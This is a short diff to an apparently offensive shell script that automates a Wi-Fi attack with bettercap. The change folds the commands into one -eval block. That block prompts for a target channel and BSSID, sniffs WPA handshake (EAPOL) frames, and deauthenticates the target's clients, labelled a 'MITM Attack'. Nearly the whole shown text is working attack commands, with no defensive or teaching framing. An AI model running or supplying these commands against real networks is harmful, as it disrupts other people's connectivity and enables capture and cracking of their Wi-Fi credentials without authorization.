@@ -46,12 +46,12 @@ enable_monitor() {
 
 # === Man-In-The-Middle === #
  yellow "Starting MITM Attack"
- 
- bettercap -iface wlan0
- wifi.recon on
- wifi.show
 read -p $'\e[1;33m[*]  Enter target channel: \e[0m'  channel
 read -p $'\e[1;33m[*]  Enter target  BSSID : \e[0m'  bssid
+ 
+ bettercap -iface wlan0 -eval "
+ wifi.recon on
+ wifi.show
  set wifi.recon.channel "$channel"
  set net.sniff.verbose true
  set net.sniff.filter ether proto 0x888e
@@ -59,3 +59,4 @@ read -p $'\e[1;33m[*]  Enter target  BSSID : \e[0m'  bssid
  wifi.show
  cyan "Deauthenticating clients"
  wifi.deauth "$bssid"
+ "
